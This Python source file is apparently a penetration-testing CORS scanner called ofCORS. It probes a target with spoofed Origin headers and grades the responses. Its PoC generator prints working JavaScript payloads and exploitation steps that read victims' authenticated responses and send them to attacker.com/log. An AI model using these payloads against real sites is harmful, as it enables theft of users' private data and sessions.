#!/usr/bin/env python3
import requests
import argparse
import json
import sys
import urllib.parse
import html
import re
import os
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse
from collections import defaultdict

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
    COLOR_SUPPORT = True
except ImportError:
    COLOR_SUPPORT = False
    class DummyFore:
        def __getattr__(self, name):
            return ""
    Fore = DummyFore()
    Style = DummyFore()

# Constants
VERSION = "1.0.2"
DEFAULT_TIMEOUT = 5
DEFAULT_THREADS = 3
MAX_URL_LENGTH = 2000
MAX_QUOTE_LENGTH = 500

def colored(text, color=None, style=None):
    if not COLOR_SUPPORT:
        return text

    color_code = getattr(Fore, color.upper(), "") if color else ""
    style_code = getattr(Style, style.upper(), "") if style else ""
    return f"{color_code}{style_code}{text}{Style.RESET_ALL}"

def print_banner():
    print(colored('╔═════════════════════════════════════════════════════╗', 'cyan'))
    print(colored('║', 'cyan') + ' ' + colored('ofCORS', 'yellow', 'bright') + ' ' * 46 + colored('║', 'cyan'))
    print(colored('║', 'cyan') + ' ' + colored(f'Version {VERSION}', 'white') + ' ' * (52 - len(f'Version {VERSION}')) + colored('║', 'cyan'))
    print(colored('║', 'cyan') + ' ' + colored('"Of course I tested CORS!"', 'green') + ' ' * 26 + colored('║', 'cyan'))
    print(colored('╚═════════════════════════════════════════════════════╝', 'cyan'))

def validate_url(url):
    try:
        if len(url) > MAX_URL_LENGTH:
            raise ValueError(f"URL too long (max {MAX_URL_LENGTH} characters)")

        result = urlparse(url)
        if not all([result.scheme, result.netloc]):
            raise ValueError("Invalid URL format - missing scheme or domain")

        if result.scheme not in ['http', 'https']:
            raise ValueError("Only HTTP/HTTPS URLs are supported")

        return True
    except Exception as e:
        print(f"{colored('[X] Invalid URL:', 'red')} {e}")
        return False

def analyze_cors_headers(headers, origin, url):
    """Improved CORS analysis that properly detects vulnerabilities"""
    results = {
        "is_vulnerable": False,
        "severity": "none",
        "issues": [],
        "reflection": False,
        "allow_credentials": False,
        "headers_found": []
    }

    headers_lower = {k.lower(): v for k, v in headers.items()}

    # Track what CORS headers we found
    cors_headers = {k: v for k, v in headers_lower.items() if k.startswith('access-control-')}
    if cors_headers:
        results["headers_found"] = list(cors_headers.keys())

    # Extract the domain from the target URL
    target_parsed = urlparse(url)
    target_domain = target_parsed.netloc

    # Determine if this is an external origin
    is_external_origin = True
    try:
        if origin and origin != "null":
            origin_parsed = urlparse(origin)
            origin_domain = origin_parsed.netloc

            if origin_domain and target_domain:
                target_parts = target_domain.split('.')
                origin_parts = origin_domain.split('.')

                # Check if same base domain
                if len(target_parts) >= 2 and len(origin_parts) >= 2:
                    target_base = '.'.join(target_parts[-2:])
                    origin_base = '.'.join(origin_parts[-2:])
                    if target_base == origin_base:
                        is_external_origin = False

                # Exact match
                if target_domain == origin_domain:
                    is_external_origin = False
    except:
        is_external_origin = True

    # Check Access-Control-Allow-Origin
    if 'access-control-allow-origin' in headers_lower:
        acao = headers_lower['access-control-allow-origin'].strip()

        # Check for wildcard - this is a vulnerability
        if acao == '*':
            results["issues"].append("Access-Control-Allow-Origin is set to wildcard '*' - allows any origin")
            results["severity"] = "medium"
            results["is_vulnerable"] = True

        # Check for origin reflection
        elif acao == origin:
            results["reflection"] = True
            if is_external_origin:
                results["issues"].append(f"Dangerous origin reflection: '{origin}' is reflected in Access-Control-Allow-Origin")
                results["severity"] = "high"
                results["is_vulnerable"] = True
            else:
                results["issues"].append(f"Origin reflection detected for same-domain origin (normal behavior)")

        # Check for other potentially dangerous values
        elif acao and acao != origin:
            if is_external_origin:
                results["issues"].append(f"CORS enabled for origin: '{acao}' (different from test origin)")
                results["severity"] = "low"

    # Check Access-Control-Allow-Credentials
    if 'access-control-allow-credentials' in headers_lower:
        if headers_lower['access-control-allow-credentials'].lower() == 'true':
            results["allow_credentials"] = True

            # Wildcard with credentials
            if 'access-control-allow-origin' in headers_lower and headers_lower['access-control-allow-origin'] == '*':
                results["issues"].append("Both ACAO=* and credentials=true (violates CORS specs)")
                results["severity"] = "high"
                results["is_vulnerable"] = True

            # External origin reflection with credentials
            elif results["reflection"] and is_external_origin:
                results["issues"].append("External origin reflection with credentials=true")
                results["severity"] = "high"
                results["is_vulnerable"] = True

    return results

def generate_origins(url):
    """Generate focused test origins - one for each attack type"""
    parsed_url = urlparse(url)
    domain = parsed_url.netloc
    protocol = parsed_url.scheme

    domain_parts = domain.split('.')
    if len(domain_parts) > 1:
        base_domain = '.'.join(domain_parts[-2:])
    else:
        base_domain = domain

    # Focused list - one test for each type of vulnerability
    origins = [
        # Test for null origin acceptance
        'null',

        # Test for basic origin reflection
        'https://attacker.com',

        # Test for subdomain trust (XSS in subdomain scenario)
        f'https://evil.{base_domain}',

        # Test for domain suffix attack
        f'{protocol}://{domain}.evil.com',

        # Test for protocol confusion
        f'http://{domain}' if protocol == 'https' else f'https://{domain}',
    ]

    return origins

def test_cors_simple(url, origin, headers=None, cookies=None, timeout=5):
    """Test CORS with better detection logic"""
    if headers is None:
        headers = {}

    # Add Origin header
    test_headers = headers.copy()
    test_headers['Origin'] = origin

    print(f"  [*] Testing {origin}...", end=' ', flush=True)

    try:
        # Test with GET request
        response = requests.get(
            url,
            headers=test_headers,
            cookies=cookies,
            timeout=timeout,
            allow_redirects=False
        )

        cors_analysis = analyze_cors_headers(response.headers, origin, url)

        result = {
            "status_code": response.status_code,
            "cors_headers": {k: v for k, v in response.headers.items() if k.lower().startswith("access-control")},
            "analysis": cors_analysis,
            "response_headers": dict(response.headers)  # Store all headers for debugging
        }

        # Improved result indication
        if cors_analysis["is_vulnerable"]:
            severity = cors_analysis['severity'].upper()
            print(colored(f"[!] VULNERABLE ({severity})", 'red'))
        elif cors_analysis["issues"]:
            print(colored("[!] Issues found", 'yellow'))
        elif cors_analysis["headers_found"]:
            print(colored("[+] CORS headers present", 'green'))
        else:
            print(colored("[+] No CORS", 'cyan'))

        return result

    except requests.exceptions.Timeout:
        print(colored("[X] TIMEOUT", 'yellow'))
        return {"error": f"Request timeout after {timeout}s"}
    except requests.exceptions.ConnectionError:
        print(colored("[X] CONNECTION ERROR", 'red'))
        return {"error": "Connection failed"}
    except requests.exceptions.RequestException as e:
        print(colored(f"[X] ERROR: {str(e)[:50]}", 'red'))
        return {"error": str(e)}
    except Exception as e:
        print(colored(f"[X] UNEXPECTED ERROR: {str(e)[:50]}", 'red'))
        return {"error": f"Unexpected error: {str(e)}"}

def test_cors_with_variations(url, headers=None, cookies=None, timeout=5):
    """Test CORS with comprehensive origin list"""
    origins = generate_origins(url)
    results = {}

    print(f"\n[*] Testing {len(origins)} origins...")

    for origin in origins:
        result = test_cors_simple(url, origin, headers, cookies, timeout)
        if result:
            results[origin] = {"GET": result}

    return results

def print_result_summary(results, url):
    """Print a detailed summary of results"""
    print(f"\n{colored('Results Summary for:', 'blue')} {url}")
    print(colored("-" * 80, 'blue'))

    vulnerable_count = 0
    total_tested = len(results)
    cors_enabled_count = 0
    vulnerable_origins = []
    poc_data = []

    # First pass: collect all vulnerability data
    for origin, methods in results.items():
        for method, result in methods.items():
            if isinstance(result, dict) and 'analysis' in result:
                analysis = result['analysis']

                # Count origins that have CORS headers
                if analysis.get('headers_found'):
                    cors_enabled_count += 1

                if analysis.get('is_vulnerable', False):
                    vulnerable_count += 1
                    severity = analysis.get('severity', 'unknown')

                    # Store vulnerability info
                    vuln_info = {
                        'origin': origin,
                        'severity': severity,
                        'issues': analysis.get('issues', []),
                        'cors_headers': result.get('cors_headers', {}),
                        'analysis': analysis
                    }
                    vulnerable_origins.append(vuln_info)

                    # Store PoC data for reflection vulnerabilities
                    if analysis.get('reflection'):
                        poc_info = {
                            'url': url,
                            'origin': origin,
                            'with_credentials': analysis.get('allow_credentials', False)
                        }
                        poc_data.append(poc_info)

    # Display all vulnerabilities
    for vuln in vulnerable_origins:
        print(f"{colored('[!] VULNERABLE:', 'red')} {vuln['origin']} - {vuln['severity'].upper()}")

        for issue in vuln['issues']:
            print(f"    - {issue}")

        # Show the actual CORS headers for vulnerable cases
        if vuln['cors_headers']:
            print(f"    [*] CORS Headers:")
            for header, value in vuln['cors_headers'].items():
                print(f"        {header}: {value}")
        print()

    # Summary statistics
    print(f"[*] Scan Summary:")
    print(f"    - Total origins tested: {total_tested}")
    print(f"    - Origins with CORS headers: {cors_enabled_count}")
    print(f"    - Vulnerable configurations: {vulnerable_count}")

    if vulnerable_count == 0:
        if cors_enabled_count > 0:
            print(colored("[+] CORS is configured but appears secure", 'green'))
        else:
            print(colored("[+] No CORS configuration detected", 'green'))
    else:
        print(colored(f"[!] Found {vulnerable_count} vulnerable CORS configurations!", 'red'))

    # Generate PoCs for all unique vulnerability types found
    if poc_data:
        # Group PoCs by attack type to avoid duplicates
        null_origin_poc = None
        reflection_poc = None

        for poc in poc_data:
            if poc['origin'] == 'null' and not null_origin_poc:
                null_origin_poc = poc
            elif poc['origin'] != 'null' and not reflection_poc:
                reflection_poc = poc

        print(f"\n{colored('[!] PROOF OF CONCEPT:', 'yellow')}")

        # Generate null origin PoC if found
        if null_origin_poc:
            print(generate_exploitation_poc(null_origin_poc['url'], null_origin_poc['origin'], null_origin_poc['with_credentials']))

        # Generate regular reflection PoC if found (and different from null)
        if reflection_poc and reflection_poc != null_origin_poc:
            print("\n" + colored("="*80, 'blue'))
            print(generate_exploitation_poc(reflection_poc['url'], reflection_poc['origin'], reflection_poc['with_credentials']))

def process_url(url, args):
    """Process a single URL with improved error handling and progress feedback"""
    print(f"\n{colored('='*80, 'blue')}")
    print(colored(f"Testing URL: {url}", 'blue'))
    print(colored("="*80, 'blue'))

    if not validate_url(url):
        return False

    # Test basic connectivity first
    print("[*] Testing basic connectivity...", end=' ', flush=True)
    try:
        test_response = requests.head(url, timeout=args.timeout, allow_redirects=False)
        print(colored(f"[+] OK (Status: {test_response.status_code})", 'green'))
    except requests.exceptions.Timeout:
        print(colored("[!] TIMEOUT - URL may be slow or unresponsive", 'yellow'))
        print("[*] Proceeding with CORS tests (may be slow)...")
    except requests.exceptions.ConnectionError:
        print(colored("[X] CONNECTION FAILED", 'red'))
        print("[X] Cannot reach the URL. Please check if it's accessible.")
        return False
    except Exception as e:
        print(colored(f"[!] WARNING: {str(e)[:50]}", 'yellow'))
        print("[*] Proceeding with CORS tests...")

    headers = {}
    if args.headers:
        for header in args.headers:
            if ':' in header:
                key, value = header.split(':', 1)
                headers[key.strip()] = value.strip()

    cookies = parse_cookies(args.cookies) if args.cookies else None

    try:
        results = test_cors_with_variations(
            url,
            headers=headers,
            cookies=cookies,
            timeout=args.timeout
        )

        # Print detailed results
        print_result_summary(results, url)

        # Check for vulnerabilities
        vulnerable_found = False
        for origin, methods in results.items():
            for method_data in methods.values():
                if isinstance(method_data, dict) and 'analysis' in method_data:
                    if method_data['analysis'].get('is_vulnerable', False):
                        vulnerable_found = True

        # Save results if requested
        if args.output:
            save_report_simple(results, args.output, url)
            print(f"\n{colored('[+] Results saved to:', 'green')} {args.output}")

        return vulnerable_found

    except Exception as e:
        print(f"{colored('[X] Error testing URL:', 'red')} {url}")
        print(f"{colored('[X] Exception:', 'red')} {str(e)}")
        return False

def save_report_simple(results, output_file, target_url):
    """Save a detailed text report"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    with open(output_file, 'w', encoding='utf-8') as f:
        f.write(f"ofCORS - CORS Vulnerability Scan Report\n")
        f.write(f"========================================\n\n")
        f.write(f"Tool: ofCORS v{VERSION}\n")
        f.write(f"Date: {timestamp}\n")
        f.write(f"Target URL: {target_url}\n\n")

        vulnerable_count = 0
        for origin, methods in results.items():
            f.write(f"Origin: {origin}\n")
            f.write("-" * (len(origin) + 8) + "\n")

            for method, result in methods.items():
                if 'error' in result:
                    f.write(f"  {method}: Error - {result['error']}\n")
                    continue

                f.write(f"  {method}: Status {result['status_code']}\n")

                if 'analysis' in result:
                    analysis = result['analysis']
                    if analysis['is_vulnerable']:
                        vulnerable_count += 1
                        f.write(f"    [!] VULNERABLE - Severity: {analysis['severity'].upper()}\n")

                    if analysis['issues']:
                        f.write("    Issues Found:\n")
                        for issue in analysis['issues']:
                            f.write(f"    - {issue}\n")

                    if result['cors_headers']:
                        f.write("    CORS Headers:\n")
                        for k, v in result['cors_headers'].items():
                            f.write(f"    - {k}: {v}\n")
                f.write("\n")
            f.write("\n")

        f.write(f"\n[*] Summary: {vulnerable_count} vulnerable configurations found\n")

def generate_exploitation_poc(url, vulnerable_origin, with_credentials=False):
    """Generate a proof of concept and exploitation steps for CORS vulnerability"""

    credentials_setting = "true" if with_credentials else "false"

    # Different PoC for null origin vs regular origin reflection
    if vulnerable_origin == "null":
        poc_code = f"""<!-- Option 1: Using fetch() with post to exfiltrate data -->
<iframe sandbox="allow-scripts" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','{url}',true);
    req.withCredentials = {credentials_setting};
    req.send();
    function reqListener() {{
        // Use fetch to send data instead of location redirect
        fetch('https://attacker.com/log', {{
            method: 'POST',
            body: 'data=' + encodeURIComponent(this.responseText)
        }}).catch(function(e) {{
            // Fallback: try image src method
            var img = new Image();
            img.src = 'https://attacker.com/log?key=' + encodeURIComponent(this.responseText.substring(0, 1000));
        }});
    }};
</script>"></iframe>

<!-- Option 2: Alternative using top-level navigation (if allow-top-navigation works) -->
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','{url}',true);
    req.withCredentials = {credentials_setting};
    req.send();
    function reqListener() {{
        // Use parent window navigation
        parent.location = 'https://attacker.com/log?key=' + encodeURIComponent(this.responseText);
    }};
</script>"></iframe>

<!-- Option 3: Using image loading for simple exfiltration -->
<iframe sandbox="allow-scripts" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','{url}',true);
    req.withCredentials = {credentials_setting};
    req.send();
    function reqListener() {{
        var img = new Image();
        img.src = 'https://attacker.com/log?data=' + encodeURIComponent(this.responseText);
    }};
</script>"></iframe>"""
        attack_type = "Null Origin Attack"
        setup_desc = "Create an HTML page with a sandboxed iframe (generates null origin)"
    else:
        poc_code = f"""<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','{url}',true);
    req.withCredentials = {credentials_setting};
    req.send();

    function reqListener() {{
        // Option 1: POST the data
        fetch('https://attacker.com/log', {{
            method: 'POST',
            body: 'data=' + encodeURIComponent(this.responseText)
        }}).catch(function(e) {{
            // Fallback: Image method
            var img = new Image();
            img.src = 'https://attacker.com/log?data=' + encodeURIComponent(this.responseText);
        }});
    }};
</script>"""
        attack_type = "Origin Reflection Attack"
        setup_desc = f"Host malicious JavaScript on {vulnerable_origin} (or any external domain)"

    poc = f"""
{colored(f'JavaScript Proof of Concept - {attack_type}:', 'cyan')}
{'=' * 60}
{poc_code}

{colored('Troubleshooting Tips:', 'cyan')}
{'=' * 60}
- {colored('[*]', 'yellow')} If location redirect doesn't work, try the fetch() method
- {colored('[*]', 'yellow')} Image loading method works in most sandbox scenarios
- {colored('[*]', 'yellow')} For null origin attacks, try different sandbox permissions
- {colored('[*]', 'yellow')} Check browser console for any CORS or CSP errors
- {colored('[*]', 'yellow')} Some webhook services block requests from sandboxed contexts

{colored('Exploitation Steps:', 'cyan')}
{'=' * 60}
1. {colored('[*] Attacker Setup:', 'yellow')}
   - {setup_desc}
   - Set up a logging endpoint at https://attacker.com/log to capture stolen data

2. {colored('[*] Victim Interaction:', 'yellow')}
   - Victim visits the attacker's website while logged into the target application
   - The malicious code executes automatically

3. {colored('[*] Attack Execution:', 'yellow')}
   - Browser sends request to {url} with victim's cookies/credentials
   - Due to CORS misconfiguration, the response is readable by attacker's script
   - Sensitive data is extracted from the response

4. {colored('[*] Data Exfiltration:', 'yellow')}
   - The responseText (containing sensitive data) is sent to attacker's server
   - Data is URL-encoded to handle special characters safely
   - Attacker now has access to victim's private information

{colored('Impact:', 'cyan')}
{'=' * 60}
- {colored('[!]', 'red')} Account takeover through session token theft
- {colored('[!]', 'red')} Personal data exposure (emails, documents, user info)
- {colored('[!]', 'red')} Financial information theft (account details, transactions)
- {colored('[!]', 'red')} Administrative data access (if victim is admin)

{colored('Remediation:', 'cyan')}
{'=' * 60}
- Replace wildcard (*) with specific trusted origins
- Implement proper origin validation on the server side
- Never trust "null" origin in production environments
- Use Access-Control-Allow-Origin with specific domains only
- Regularly audit CORS configuration for security issues
"""

    return poc

def parse_cookies(cookie_string):
    cookies = {}
    if not cookie_string:
        return cookies

    pairs = cookie_string.split(';')
    for pair in pairs:
        if '=' in pair:
            name, value = pair.strip().split('=', 1)
            cookies[name] = value

    return cookies

def main():
    parser = argparse.ArgumentParser(
        description="ofCORS - CORS Vulnerability Scanner (Fixed Version)",
        epilog='''
Examples:
  %(prog)s -u https://api.example.com/data
  %(prog)s -f urls.txt
  %(prog)s -u https://app.com/api -H "Authorization: Bearer token"
  %(prog)s -u https://example.com --timeout 10 -o results.txt
        ''',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", help="Target URL to test")
    group.add_argument("-f", "--file", help="File containing URLs to test (one per line)")

    parser.add_argument("-o", "--output", help="Output file for results")
    parser.add_argument("-H", "--headers", action='append', help="Additional headers (format: 'Name: Value')")
    parser.add_argument("--cookies", help="Cookies to include with requests (format: 'name1=value1; name2=value2')")
    parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT, help=f"Request timeout in seconds (default: {DEFAULT_TIMEOUT})")
    parser.add_argument("--version", action="version", version=f"ofCORS v{VERSION}")

    args = parser.parse_args()

    print_banner()
    print(f"[*] Timeout set to: {args.timeout} seconds")
    print("[*] Note: Comprehensive CORS testing with improved detection\n")

    vulnerable_urls = []

    if args.url:
        vulnerable_found = process_url(args.url, args)
        if vulnerable_found:
            vulnerable_urls.append(args.url)

    elif args.file:
        urls = []
        try:
            with open(args.file, 'r') as f:
                urls = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except Exception as e:
            print(f"{colored('[X] Error reading file:', 'red')} {str(e)}")
            sys.exit(1)

        print(f"[*] Loaded {len(urls)} URLs from {args.file}")

        for i, url in enumerate(urls, 1):
            print(f"\n{colored(f'[*] Processing URL {i}/{len(urls)}', 'cyan')}")
            vulnerable_found = process_url(url, args)
            if vulnerable_found:
                vulnerable_urls.append(url)

    # Final summary
    print("\n" + colored("="*80, 'blue'))
    print(colored("FINAL SCAN SUMMARY", 'blue'))
    print(colored("="*80, 'blue'))

    if args.file:
        print(f"[*] Total URLs tested: {len(urls)}")
    else:
        print(f"[*] Total URLs tested: 1")

    print(f"[*] Vulnerable URLs found: {colored(str(len(vulnerable_urls)), 'red' if vulnerable_urls else 'green')}")

    if vulnerable_urls:
        print(f"\n{colored('[!] Vulnerable URLs:', 'red')}")
        for url in vulnerable_urls:
            print(f"    - {url}")
        print(f"\n{colored('[!] CORS vulnerabilities detected! Review the results above.', 'red')}")
    else:
        print(f"\n{colored('[+] No CORS vulnerabilities found in tested URLs.', 'green')}")

    if args.output and args.file:
        print(f"\n[*] Individual results saved for each URL")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{colored('[X] Scan interrupted by user. Exiting...', 'yellow')}")
        sys.exit(0)
    except Exception as e:
        print(f"{colored('[X] Unhandled exception:', 'red')} {str(e)}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
